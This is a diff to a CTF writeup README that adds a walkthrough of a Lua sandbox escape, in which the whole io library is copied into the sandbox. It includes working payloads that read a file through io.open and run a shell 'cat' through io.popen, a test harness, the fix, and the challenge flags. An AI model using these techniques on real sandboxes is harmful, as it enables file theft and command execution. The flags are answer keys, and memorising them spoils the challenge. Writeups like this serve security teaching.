@@ -1,17 +1,17 @@
 # Pointer Overflow CTF 2026
 
-Writeups for the crypto challenges in this directory. The solver for each
-challenge lives alongside this file.
+Writeups for the crypto and exploitation challenges in this directory. The
+solver or payload for each challenge lives alongside this file.
 
 All solvers run from the repository's Nix dev shell, which provides SBCL for
-the Lisp solvers and uv for Python:
+the Lisp solvers, uv for Python, and Lua 5.4 for the sandbox payload:
 
 ```console
 nix develop
 ```
 
-The Lisp solvers run with `sbcl --script <file>`, and the Python solvers run
-with `uv run <file>`.
+The Lisp solvers run with `sbcl --script <file>`, the Python solvers run with
+`uv run <file>`, and the Lua payload is submitted to SafeLua as user code.
 
 ## 1. Letters Never Sent
 
@@ -440,6 +440,144 @@ flag:  POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}
 POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}
 ```
 
+## exploit3: The Sandglass
+
+**Payload:** `exploit3-the-sandglass.lua`
+
+### The setup
+
+SafeLua v0.9 builds a fresh environment containing only a small set of
+globals. It also copies `io` into that environment so that user code can read
+configuration files:
+
+```lua
+-- Copy io for config file reads. TODO(mchetti): filter to just read/write.
+local safe_io = {}
+for k, v in pairs(io) do safe_io[k] = v end
+safe_env.io = safe_io
+```
+
+The comment states the intended restriction: only `io.read` and `io.write`
+should be exposed. The implementation does not do that. `pairs(io)` copies
+every field of the standard `io` table, including:
+
+- `io.open` — open and read any path the process can access
+- `io.lines` — read any file line by line
+- `io.popen` — spawn a shell command and read its output
+- `io.tmpfile`, `io.output`, `io.input`, and the standard streams
+
+The rest of the whitelist is not relevant here. There is no need to recover
+`load`, find `_G`, or reach `os` or `debug`; the file-read primitive is already
+in the sandbox.
+
+### The exploit
+
+The challenge exposes `team_id` as a global and gives the flag path:
+
+```text
+/tmp/poctf/sandglass/flag-<team_id>.txt
+```
+
+Since `io.open` is available, user code can construct that path, read the
+file, and return its contents. The wrapper passes the return value through
+`tostring(result)`, so the flag is printed as the submission result:
+
+```lua
+local path = "/tmp/poctf/sandglass/flag-" .. tostring(team_id) .. ".txt"
+
+local file, err = io.open(path, "r")
+if not file then
+    error("io.open failed: " .. tostring(err))
+end
+
+local flag = file:read("*a")
+file:close()
+return flag
+```
+
+No sandbox escape beyond the `io` library is needed. The vulnerability is
+simply that the developer copied the whole library instead of selecting the
+two safe functions.
+
+If a deployment also removed `io.open`, the same bug exposes a command
+execution primitive through `io.popen`:
+
+```lua
+local path = "/tmp/poctf/sandglass/flag-" .. tostring(team_id) .. ".txt"
+local pipe = assert(io.popen("cat " .. path))
+local flag = pipe:read("*a")
+pipe:close()
+return flag
+```
+
+### Local verification
+
+The repository dev shell provides Lua 5.4:
+
+```console
+nix develop
+lua -v
+```
+
+A minimal harness can reproduce the server's `load` call and create a dummy
+flag file:
+
+```lua
+-- harness.lua
+local team_id = assert(tonumber(arg[2]))
+local source = assert(io.open(arg[1])):read("*a")
+
+local safe_env = {}
+for _, name in ipairs({
+    "print", "tostring", "tonumber", "type", "select",
+    "pairs", "ipairs", "next", "pcall", "xpcall", "error",
+    "string", "math", "table",
+}) do
+    safe_env[name] = _G[name]
+end
+
+local safe_io = {}
+for k, v in pairs(io) do safe_io[k] = v end
+safe_env.io = safe_io
+safe_env.team_id = team_id
+
+local chunk = assert(load(source, "sandbox", "t", safe_env))
+local ok, result = pcall(chunk)
+print(ok and result or ("runtime error: " .. tostring(result)))
+```
+
+Run it with a dummy flag:
+
+```console
+mkdir -p /tmp/poctf/sandglass
+printf 'POCTF{local-test}\n' > /tmp/poctf/sandglass/flag-1234.txt
+lua harness.lua exploit3-the-sandglass.lua 1234
+```
+
+Expected output:
+
+```text
+POCTF{local-test}
+```
+
+The real submission returns the flag for the current team; the flag itself is
+team-specific and is not hardcoded in the payload.
+
+### Fix
+
+Expose only the intended functions:
+
+```lua
+safe_env.io = {
+    read = io.read,
+    write = io.write,
+}
+```
+
+If configuration-file access is genuinely required, wrap `io.open` with a
+path allowlist and do not expose `io.popen`, `io.lines`, `io.tmpfile`, or the
+raw `io` table.
+
 ## Summary
 
 | # | Challenge | Technique | Flag |
@@ -449,3 +587,4 @@ POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}
 | 3 | The Consulting Room | CBC padding oracle over multiplexed HTTP/2 | `POCTF{72.1619.SJM23L4UOHQLVK2A.7T27T36CQJKWPXIV5KB5W5MTPF}` |
 | 7 | The Notary's Seal | Textbook RSA, low exponent, integer cube root | `POCTF{75.1619.QYL3A7E63L6VBSHC.ZJFJ4JO7TKGSPUFMGUUOGJGRR5}` |
 | 8 | Forty Measures Deep | MIDI note cipher, musical alphabet | `POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}` |
+| exploit3 | The Sandglass | Lua sandbox escape, arbitrary file read via `io.open` | `POCTF{128.1619.687dd42ffb219159.H4NH7DMPZGZUPGEWF3UQSSIWCJ}` |
